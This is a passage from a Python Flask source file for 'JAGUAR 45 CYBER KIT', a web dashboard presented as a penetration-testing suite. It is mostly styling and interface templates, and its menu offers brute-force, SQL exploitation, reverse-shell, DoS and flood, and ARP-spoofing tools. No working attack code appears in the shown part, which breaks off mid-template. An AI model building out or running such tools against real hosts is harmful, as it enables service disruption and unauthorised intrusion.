# app.py - JAGUAR 45 CYBER KIT - Ultimate Security Toolkit
import os
import sys
import socket
import time
import json
import requests
import hashlib
import threading
import random
import string
import ipaddress
import ssl
import base64
import urllib.parse
import concurrent.futures
import subprocess
import re
import urllib3
import struct
import select
import asyncio
import aiohttp
import dns.resolver
import whois
import paramiko
import ftplib
import smtplib
import telnetlib
import mimetypes
import csv
import xml.etree.ElementTree as ET
from flask import Flask, render_template_string, request, jsonify, Response, stream_with_context
from flask_cors import CORS
from urllib.parse import urlparse, quote, unquote, urljoin, parse_qs
from datetime import datetime, timedelta
import http.client
import socks
from bs4 import BeautifulSoup
import cryptography
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import OpenSSL
import socketio
import gevent
from gevent import monkey
monkey.patch_all()

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import warnings
warnings.filterwarnings("ignore")

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})
app.secret_key = os.urandom(32)
app.config['JSON_SORT_KEYS'] = False
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True

# HTML Interface - Ultimate Cyber Kit
HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ JAGUAR 45 CYBER KIT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --jaguar-black: #0a0a0a;
            --jaguar-dark: #121212;
            --jaguar-gray: #1a1a1a;
            --jaguar-green: #00ff88;
            --jaguar-cyan: #00ffff;
            --jaguar-blue: #0088ff;
            --jaguar-purple: #aa00ff;
            --jaguar-red: #ff0055;
            --jaguar-yellow: #ffff00;
            --jaguar-orange: #ff8800;
            --jaguar-pink: #ff00aa;
            --text-primary: #ffffff;
            --text-secondary: #cccccc;
            --text-dim: #888888;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--jaguar-black);
            color: var(--text-primary);
            font-family: 'Segoe UI', 'Courier New', monospace;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 255, 136, 0.05) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(0, 255, 255, 0.05) 0%, transparent 20%);
        }
        
        .cyber-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 136, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 136, 0.1) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            opacity: 0.1;
        }
        
        .container {
            max-width: 1800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 3px solid var(--jaguar-green);
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, transparent, var(--jaguar-cyan), transparent);
            animation: scan 3s linear infinite;
        }
        
        @keyframes scan {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .logo {
            font-size: 3.5rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--jaguar-green), var(--jaguar-cyan), var(--jaguar-purple));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        
        .tagline {
            color: var(--jaguar-cyan);
            font-size: 1.2rem;
            margin-bottom: 15px;
            font-weight: 300;
        }
        
        .warning-banner {
            background: linear-gradient(90deg, var(--jaguar-red), var(--jaguar-orange));
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
            font-weight: bold;
            box-shadow: 0 0 20px rgba(255, 0, 85, 0.3);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        
        .main-dashboard {
            display: grid;
            grid-template-columns: 280px 1fr 350px;
            gap: 25px;
            min-height: 800px;
        }
        
        @media (max-width: 1400px) {
            .main-dashboard {
                grid-template-columns: 1fr;
            }
        }
        
        .sidebar {
            background: var(--jaguar-dark);
            border: 2px solid var(--jaguar-green);
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
        }
        
        .tool-category {
            margin-bottom: 30px;
        }
        
        .category-title {
            color: var(--jaguar-cyan);
            font-size: 1.1rem;
            margin-bottom: 15px;
            padding-bottom: 8px;
            border-bottom: 2px solid rgba(0, 255, 255, 0.3);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .tool-list {
            list-style: none;
        }
        
        .tool-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 6px;
            padding: 12px 15px;
            margin: 8px 0;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 0.95rem;
        }
        
        .tool-item:hover {
            background: rgba(0, 255, 136, 0.1);
            border-color: var(--jaguar-green);
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.2);
        }
        
        .tool-item.active {
            background: rgba(0, 255, 136, 0.15);
            border-color: var(--jaguar-green);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        
        .tool-item.danger {
            border-color: rgba(255, 0, 85, 0.3);
            color: var(--jaguar-red);
        }
        
        .tool-item.danger:hover {
            background: rgba(255, 0, 85, 0.1);
            border-color: var(--jaguar-red);
            box-shadow: 0 5px 15px rgba(255, 0, 85, 0.2);
        }
        
        .tool-item.warning {
            border-color: rgba(255, 255, 0, 0.3);
            color: var(--jaguar-yellow);
        }
        
        .main-panel {
            background: var(--jaguar-dark);
            border: 2px solid var(--jaguar-green);
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
            overflow: hidden;
        }
        
        .tool-section {
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        .tool-section.active {
            display: block;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .section-header {
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid rgba(0, 255, 136, 0.3);
        }
        
        .section-header h2 {
            color: var(--jaguar-green);
            font-size: 1.8rem;
            margin-bottom: 8px;
        }
        
        .section-header p {
            color: var(--text-secondary);
            font-size: 1rem;
        }
        
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            color: var(--jaguar-cyan);
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.95rem;
        }
        
        .form-input {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 6px;
            color: var(--text-primary);
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            transition: all 0.3s ease;
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--jaguar-green);
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
        }
        
        .form-textarea {
            min-height: 120px;
            resize: vertical;
        }
        
        .btn-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin: 25px 0;
        }
        
        .btn {
            padding: 12px 25px;
            background: linear-gradient(45deg, var(--jaguar-green), var(--jaguar-cyan));
            border: none;
            border-radius: 6px;
            color: var(--jaguar-black);
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 0.95rem;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.3);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, var(--jaguar-red), var(--jaguar-orange));
        }
        
        .btn-warning {
            background: linear-gradient(45deg, var(--jaguar-yellow), var(--jaguar-orange));
        }
        
        .btn-purple {
            background: linear-gradient(45deg, var(--jaguar-purple), var(--jaguar-pink));
        }
        
        .results-panel {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 8px;
            padding: 20px;
            margin-top: 25px;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .result-item {
            padding: 15px;
            margin: 10px 0;
            background: rgba(0, 0, 0, 0.3);
            border-left: 4px solid var(--jaguar-green);
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }
        
        .result-item.success { border-left-color: var(--jaguar-green); }
        .result-item.warning { border-left-color: var(--jaguar-yellow); }
        .result-item.error { border-left-color: var(--jaguar-red); }
        .result-item.info { border-left-color: var(--jaguar-cyan); }
        
        .console-output {
            background: #000;
            color: var(--jaguar-green);
            font-family: 'Courier New', monospace;
            padding: 15px;
            border-radius: 6px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            font-size: 0.85rem;
            line-height: 1.4;
        }
        
        .status-panel {
            background: var(--jaguar-dark);
            border: 2px solid var(--jaguar-cyan);
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .stat-box {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 255, 255, 0.2);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: var(--jaguar-cyan);
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 0.8rem;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .progress-container {
            margin: 20px 0;
        }
        
        .progress-bar {
            height: 8px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--jaguar-green), var(--jaguar-cyan));
            width: 0%;
            transition: width 0.5s ease;
        }
        
        .attack-monitor {
            background: rgba(255, 0, 85, 0.1);
            border: 1px solid var(--jaguar-red);
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
        }
        
        .monitor-title {
            color: var(--jaguar-red);
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: var(--jaguar-cyan);
        }
        
        .spinner {
            border: 4px solid rgba(0, 255, 255, 0.1);
            border-top-color: var(--jaguar-cyan);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 50px;
            border-top: 1px solid rgba(0, 255, 136, 0.2);
            color: var(--text-dim);
            font-size: 0.9rem;
        }
        
        .copyright {
            color: var(--jaguar-green);
            font-weight: bold;
            margin-top: 10px;
        }
        
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.03;
            pointer-events: none;
        }
        
        .tab-container {
            display: flex;
            border-bottom: 2px solid rgba(0, 255, 136, 0.2);
            margin-bottom: 20px;
        }
        
        .tab {
            padding: 12px 25px;
            background: transparent;
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.3s ease;
            border-bottom: 3px solid transparent;
            font-weight: 600;
        }
        
        .tab:hover {
            color: var(--jaguar-green);
        }
        
        .tab.active {
            color: var(--jaguar-green);
            border-bottom-color: var(--jaguar-green);
            background: rgba(0, 255, 136, 0.05);
        }
        
        .code-block {
            background: #000;
            color: var(--jaguar-green);
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            margin: 15px 0;
        }
        
        .alert {
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .alert-danger {
            background: rgba(255, 0, 85, 0.1);
            border: 1px solid var(--jaguar-red);
            color: var(--jaguar-red);
        }
        
        .alert-warning {
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid var(--jaguar-yellow);
            color: var(--jaguar-yellow);
        }
        
        .alert-success {
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid var(--jaguar-green);
            color: var(--jaguar-green);
        }
        
        .port-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 10px;
            margin: 15px 0;
        }
        
        .port-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 4px;
            padding: 10px;
            text-align: center;
            font-family: 'Courier New', monospace;
        }
        
        .port-item.open {
            background: rgba(0, 255, 136, 0.1);
            border-color: var(--jaguar-green);
            color: var(--jaguar-green);
        }
        
        .vulnerability-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .vuln-item {
            padding: 12px;
            margin: 8px 0;
            background: rgba(255, 0, 85, 0.05);
            border: 1px solid rgba(255, 0, 85, 0.2);
            border-radius: 4px;
        }
        
        .vuln-title {
            color: var(--jaguar-red);
            font-weight: bold;
            margin-bottom: 5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .severity {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: bold;
            text-transform: uppercase;
        }
        
        .severity.critical { background: var(--jaguar-red); color: white; }
        .severity.high { background: #ff5500; color: white; }
        .severity.medium { background: #ffaa00; color: black; }
        .severity.low { background: #00aaff; color: white; }
        .severity.info { background: var(--jaguar-cyan); color: black; }
    </style>
</head>
<body>
    <div class="cyber-grid"></div>
    <canvas id="matrixRain" class="matrix-rain"></canvas>
    
    <div class="container">
        <div class="header">
            <div class="logo">JAGUAR 45 CYBER KIT</div>
            <div class="tagline">ULTIMATE SECURITY & PENETRATION TESTING SUITE</div>
            <div class="warning-banner">
                <i class="fas fa-skull-crossbones"></i> WARNING: Authorized Security Testing Only | Charlie Syllas & Jaguar 45 ©2026
            </div>
        </div>
        
        <div class="main-dashboard">
            <!-- Left Sidebar - Tools Menu -->
            <div class="sidebar">
                <div class="tool-category">
                    <div class="category-title">
                        <i class="fas fa-crosshairs"></i> RECONNAISSANCE
                    </div>
                    <ul class="tool-list">
                        <li class="tool-item active" onclick="showTool('recon')">
                            <i class="fas fa-search"></i> Network Recon
                        </li>
                        <li class="tool-item" onclick="showTool('portscan')">
                            <i class="fas fa-network-wired"></i> Port Scanner
                        </li>
                        <li class="tool-item" onclick="showTool('subdomain')">
                            <i class="fas fa-sitemap"></i> Subdomain Finder
                        </li>
                        <li class="tool-item" onclick="showTool('dirscan')">
                            <i class="fas fa-folder-tree"></i> Directory Bruteforce
                        </li>
                        <li class="tool-item" onclick="showTool('dns')">
                            <i class="fas fa-server"></i> DNS Enumerator
                        </li>
                        <li class="tool-item" onclick="showTool('whois')">
                            <i class="fas fa-user-secret"></i> WHOIS Lookup
                        </li>
                    </ul>
                </div>
                
                <div class="tool-category">
                    <div class="category-title">
                        <i class="fas fa-shield-alt"></i> VULNERABILITY SCANNING
                    </div>
                    <ul class="tool-list">
                        <li class="tool-item" onclick="showTool('vulnscan')">
                            <i class="fas fa-bug"></i> Web Vuln Scanner
                        </li>
                        <li class="tool-item" onclick="showTool('sqli')">
                            <i class="fas fa-database"></i> SQL Injection
                        </li>
                        <li class="tool-item" onclick="showTool('xss')">
                            <i class="fas fa-code"></i> XSS Scanner
                        </li>
                        <li class="tool-item" onclick="showTool('lfi')">
                            <i class="fas fa-file"></i> LFI/RFI Scanner
                        </li>
                        <li class="tool-item" onclick="showTool('cmdi')">
                            <i class="fas fa-terminal"></i> Command Injection
                        </li>
                        <li class="tool-item" onclick="showTool('sslscan')">
                            <i class="fas fa-lock"></i> SSL/TLS Scanner
                        </li>
                    </ul>
                </div>
                
                <div class="tool-category">
                    <div class="category-title">
                        <i class="fas fa-fire"></i> EXPLOITATION
                    </div>
                    <ul class="tool-list">
                        <li class="tool-item danger" onclick="showTool('bruteforce')">
                            <i class="fas fa-key"></i> Password Bruteforce
                        </li>
                        <li class="tool-item danger" onclick="showTool('sshbrute')">
                            <i class="fas fa-desktop"></i> SSH Bruteforce
                        </li>
                        <li class="tool-item danger" onclick="showTool('ftpbrute')">
                            <i class="fas fa-file-upload"></i> FTP Bruteforce
                        </li>
                        <li class="tool-item danger" onclick="showTool('sqlexploit')">
                            <i class="fas fa-database"></i> SQL Exploitation
                        </li>
                        <li class="tool-item danger" onclick="showTool('xsspayload')">
                            <i class="fas fa-bolt"></i> XSS Payload Generator
                        </li>
                        <li class="tool-item danger" onclick="showTool('reverse')">
                            <i class="fas fa-broadcast-tower"></i> Reverse Shell
                        </li>
                    </ul>
                </div>
                
                <div class="tool-category">
                    <div class="category-title">
                        <i class="fas fa-skull"></i> ATTACK TOOLS
                    </div>
                    <ul class="tool-list">
                        <li class="tool-item danger" onclick="showTool('dos')">
                            <i class="fas fa-bomb"></i> DoS/DDoS Attack
                        </li>
                        <li class="tool-item danger" onclick="showTool('slowloris')">
                            <i class="fas fa-tachometer-alt"></i> Slowloris Attack
                        </li>
                        <li class="tool-item danger" onclick="showTool('httpflood')">
                            <i class="fas fa-water"></i> HTTP Flood
                        </li>
                        <li class="tool-item danger" onclick="showTool('synflood')">
                            <i class="fas fa-sync"></i> SYN Flood
                        </li>
                        <li class="tool-item danger" onclick="showTool('udpflood')">
                            <i class="fas fa-satellite-dish"></i> UDP Flood
                        </li>
                        <li class="tool-item danger" onclick="showTool('arp')">
                            <i class="fas fa-network-wired"></i> ARP Spoofing
                        </li>
                    </ul>
                </div>
                
                <div class="tool-category">
                    <div class="category-title">
                        <i class="fas fa-tools"></i> UTILITIES
                    </div>
                    <ul class="tool-list">
                        <li class="tool-item" onclick="showTool('encoder')">
                            <i class="fas fa-code"></i> Encoder/Decoder
                        </li>
                        <li class="tool-item" onclick="showTool('hasher')">
                            <i class="fas fa-hashtag"></i> Hash Generator
                        </li>
                        <li class="tool-item" onclick="showTool('ipcalc')">
                            <i class="fas fa-calculator"></i> IP Calculator
                        </li>
                        <li class="tool-item" onclick="showTool('payloads')">
                            <i class="fas fa-magic"></i> Payload Generator
                        </li>
                        <li class="tool-item" onclick="showTool('crawler')">
                            <i class="fas fa-spider"></i> Web Crawler
                        </li>
                        <li class="tool-item" onclick="showTool('report')">
                            <i class="fas fa-file-pdf"></i> Report Generator
                        </li>
                    </ul>
                </div>
            </div>
            
            <!-- Main Panel - Tool Content -->
            <div class="main-panel" id="mainPanel">
                <!-- Tool sections will be dynamically loaded here -->
                <div id="toolContent"></div>
            </div>
            
            <!-- Right Panel - Status & Monitoring -->
            <div class="status-panel">
                <h3><i class="fas fa-chart-line"></i> SYSTEM MONITOR</h3>
                
                <div class="stats-grid">
                    <div class="stat-box">
                        <div class="stat-value" id="statScans">0</div>
                        <div class="stat-label">Active Scans</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="statVulns">0</div>
                        <div class="stat-label">Vulns Found</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="statPorts">0</div>
                        <div class="stat-label">Open Ports</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="statSuccess">0</div>
                        <div class="stat-label">Success Rate</div>
                    </div>
                </div>
                
                <div class="progress-container">
                    <div class="form-label">System Load</div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="systemLoad" style="width: 30%"></div>
                    </div>
                </div>
                
                <div class="attack-monitor">
                    <div class="monitor-title">
                        <i class="fas fa-broadcast-tower"></i> ATTACK MONITOR
                    </div>
                    <div id="attackStatus">No active attacks</div>
                    <div class="progress-bar" style="margin-top: 10px;">
                        <div class="progress-fill" id="attackProgress" style="width: 0%"></div>
                    </div>
                </div>
                
                <div style="margin-top: 25px;">
                    <div class="form-label">Recent Activity</div>
                    <div class="console-output" id="activityLog" style="height: 200px; font-size: 0.8rem;">
[SYSTEM] Jaguar 45 Cyber Kit Initialized
[INFO] Ready for security operations
                    </div>
                </div>
                
                <div style="margin-top: 25px;">
                    <button class="btn" onclick="clearLogs()" style="width: 100%;">
                        <i class="fas fa-trash"></i> Clear Logs
                    </button>
                    <button class="btn-danger" onclick="stopAll()" style="width: 100%; margin-top: 10px;">
                        <i class="fas fa-stop"></i> Stop All Operations
                    </button>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>JAGUAR 45 CYBER KIT v4.5 | Advanced Penetration Testing Framework</p>
            <p class="copyright">Developed by Charlie Syllas & Jaguar 45 ©2026 | All Rights Reserved</p>
            <p style="margin-top: 10px; font-size: 0.8rem; color: var(--jaguar-cyan);">
                <i class="fas fa-shield-alt"></i> For Authorized Security Testing Only
            </p>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentTool = 'recon';
        let activeScans = {};
        let activityLog = [];
        let stats = {
            scans: 0,
            vulns: 0,
            ports: 0,
            success: 0
        };
        
        // Matrix rain effect
        const matrixCanvas = document.getElementById('matrixRain');
        const matrixCtx = matrixCanvas.getContext('2d');
        
        function resizeMatrix() {
            matrixCanvas.width = window.innerWidth;
            matrixCanvas.height = window.innerHeight;
        }
        
        window.addEventListener('resize', resizeMatrix);
        resizeMatrix();
        
        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ$+-*/=%\"'#&_(),.;:?!\\|{}<>[]^~";
        const charArray = chars.split("");
        const fontSize = 14;
        const columns = matrixCanvas.width / fontSize;
        const drops = [];
        
        for(let i = 0; i < columns; i++) {
            drops[i] = Math.floor(Math.random() * matrixCanvas.height / fontSize);
        }
        
        function drawMatrix() {
            matrixCtx.fillStyle = 'rgba(10, 10, 10, 0.04)';
            matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
            
            matrixCtx.fillStyle = '#00ff88';
            matrixCtx.font = `${fontSize}px monospace`;
            
            for(let i = 0; i < drops.length; i++) {
                const text = charArray[Math.floor(Math.random() * charArray.length)];
                matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        
        // Tool management
        function showTool(toolId) {
            currentTool = toolId;
            
            // Update active tool in sidebar
            document.querySelectorAll('.tool-item').forEach(item => {
                item.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Load tool content
            loadToolContent(toolId);
        }
        
        function loadToolContent(toolId) {
            const toolContent = document.getElementById('toolContent');
            toolContent.innerHTML = '<div class="loading"><div class="spinner"></div>Loading tool...</div>';
            
            setTimeout(() => {
                switch(toolId) {
                    case 'recon':
                        toolContent.innerHTML = getReconTool();
                        break;
                    case 'portscan':
                        toolContent.innerHTML = getPortScanTool();
                        break;
                    case 'subdomain':
                        toolContent.innerHTML = getSubdomainTool();
                        break;
                    case 'dirscan':
                        toolContent.innerHTML = getDirScanTool();
                        break;
                    case 'vulnscan':
                        toolContent.innerHTML = getVulnScanTool();
                        break;
                    case 'sqli':
                        toolContent.innerHTML = getSQLiTool();
                        break;
                    case 'xss':
                        toolContent.innerHTML = getXSSTool();
                        break;
                    case 'lfi':
                        toolContent.innerHTML = getLFITool();
                        break;
                    case 'cmdi':
                        toolContent.innerHTML = getCMDiTool();
                        break;
                    case 'bruteforce':
                        toolContent.innerHTML = getBruteForceTool();
                        break;
                    case 'sshbrute':
                        toolContent.innerHTML = getSSHBruteTool();
                        break;
                    case 'dos':
                        toolContent.innerHTML = getDOSTool();
                        break;
                    case 'encoder':
                        toolContent.innerHTML = getEncoderTool();
                        break;
                    case 'hasher':
                        toolContent.innerHTML = getHasherTool();
                        break;
                    case 'dns':
                        toolContent.innerHTML = getDNSTool();
                        break;
                    case 'whois':
                        toolContent.innerHTML = getWHOISTool();
                        break;
                    case 'sslscan':
                        toolContent.innerHTML = getSSLScanTool();
                        break;
                    case 'ftpbrute':
                        toolContent.innerHTML = getFTPBruteTool();
                        break;
                    case 'sqlexploit':
                        toolContent.innerHTML = getSQLExploitTool();
                        break;
                    case 'xsspayload':
                        toolContent.innerHTML = getXSSPayloadTool();
                        break;
                    case 'slowloris':
                        toolContent.innerHTML = getSlowlorisTool();
                        break;
                    case 'httpflood':
                        toolContent.innerHTML = getHTTPFloodTool();
                        break;
                    case 'synflood':
                        toolContent.innerHTML = getSYNFloodTool();
                        break;
                    case 'udpflood':
                        toolContent.innerHTML = getUDPFloodTool();
                        break;
                    case 'arp':
                        toolContent.innerHTML = getARPTool();
                        break;
                    case 'ipcalc':
                        toolContent.innerHTML = getIPCalcTool();
                        break;
                    case 'payloads':
                        toolContent.innerHTML = getPayloadsTool();
                        break;
                    case 'crawler':
                        toolContent.innerHTML = getCrawlerTool();
                        break;
                    case 'report':
                        toolContent.innerHTML = getReportTool();
                        break;
                    case 'reverse':
                        toolContent.innerHTML = getReverseShellTool();
                        break;
                    default:
                        toolContent.innerHTML = getReconTool();
                }
            }, 100);
        }
        
        // Tool templates
        function getReconTool() {
            return `
                <div class="tool-section active">
                    <div class="section-header">
                        <h2><i class="fas fa-search"></i> NETWORK RECONNAISSANCE</h2>
                        <p>Comprehensive target intelligence gathering</p>
                    </div>
                    
                    <div class="alert alert-warning">
                        <i class="fas fa-exclamation-triangle"></i> Gather information before launching attacks
                    </div>
                    
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Target (IP/Domain):</label>
                            <input type="text" id="reconTarget" class="form-input" placeholder="example.com or 192.168.1.1" value="example.com">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Scan Options:</label>
                            <div style="margin-top: 10px;">
                                <label style="display: block; margin: 5px 0;">
                                    <input type="checkbox" id="reconDNS" checked> DNS Enumeration
                                </label>
                                <label style="display: block; margin: 5px 0;">
                                    <input type="checkbox" id="reconPorts" checked> Port Scanning
                                </label>
                                <label style="display: block; margin: 5px 0;">
                                    <input type="checkbox" id="reconWHOIS" checked> WHOIS Lookup
                                </label>
                                <label style="display: block; margin: 5px 0;">
                                    <input type="checkbox" id="reconTech" checked> Technology Detection
                                </label>
                            </div>
                        </div>
                    </div>
                    
                    <div class="btn-group">
                        <button class="btn" onclick="startRecon()">
                            <i class="fas fa-play"></i> Start Reconnaissance
                        </button>
                        <button class="btn-purple" onclick="startFullRecon()">
                            <i class="fas fa-rocket"></i> Full Recon Scan
                        </button>
                        <button class="btn-danger" onclick="stopScan('recon')">
                            <i class="fas fa-stop"></i> Stop
                        </button>
                    </div>
                    
                    <div class="results-panel" id="reconResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            `;
        }
        
        function getPortScanTool() {
            return `
                <div class="tool-section active">
                    <div class="section-header">
                        <h2><i class="fas fa-network-wired"></i> ADVANCED PORT SCANNER</h2>
                        <p>High-speed port scanning with service detection</p>
                    </div>
                    
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Target:</label>
                            <input type="text" id="portTarget" class="form-input" placeholder="192.168.1.1 or example.com">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Scan Type:</label>
                            <select id="portType" class="form-input">
                                <option value="quick">Quick Scan (Top 100)</option>
                                <option value="common">Common Ports</option>
                                <option value="full">Full Scan (1-1000)</option>
                                <option value="stealth">Stealth Scan</option>
                                <option value="udp">UDP Scan</option>
                                <option value="aggressive">Aggressive Scan</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Custom Port Range:</label>
                            <input type="text" id="customPorts" class="form-input" placeholder="1-1000 or 80,443,8080">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Threads:</label>
                            <input type="number" id="portThreads" class="form-input" value="200" min="1" max="1000">
                        </div>
                    </div>
                    
                    <div class="btn-group">
                        <button class="btn" onclick="startPortScan()">
                            <i class="fas fa-search"></i> Start Port Scan
                        </button>
                        <button class="btn-warning" onclick="startStealthScan()">
                            <i class="fas fa-user-secret"></i> Stealth Scan
                        </button>
                        <button class="btn-danger" onclick="stopScan('port')">
                            <i class="fas fa-stop"></i> Stop Scan
                        </button>
                    </div>
                    
                    <div class="progress-container">
                        <div class="form-label">Scan Progress</div>
                        <div class="progress-bar">
                            <div class="progress-fill" id="portProgress" style="width: 0%"></div>
                        </div>
                    </div>
                    
                    <div class="results-panel" id="portResults">
                        <!-- Results will appear here -->
                    </div>
                </div>
            `;
        }
        
        function getSubdomainTool() {
            return `
                <div class="tool-section active">
                    <div class="section-header">
                        <h2><i class="fas fa-sitemap"></i> SUBDOMAIN ENUMERATOR</h2>
                        <p>Discover subdomains through multiple techniques</p>
                    </div>
                    
                    <div class="form-grid">
                        <div class="form-group">
                            <label class="form-label">Domain:</label>
                            <input type="text" id="subDomain" class="form-input" placeholder="example.com" value="example.com">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Enumeration Method:</label>
                            <select id="subMethod" class="form-input">
                                <option value="brute">Brute Force</option>
                                <option value="dns">DNS Enumeration</option>
                                <option value="cert">Certificate Transparency</option>
                                <option value="all">All Methods</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Wordlist Size:</label>
                            <select id="subWordlist" class="form-input">
                                <option value="small">Small (1k words)</option>
                                <option value="medium" selected>Medium (10k words)</option>
                                <option value="large">Large (50k words)</option>
                            </select>
                        </div>
                    </div>
                    
                    <div class="btn-group">
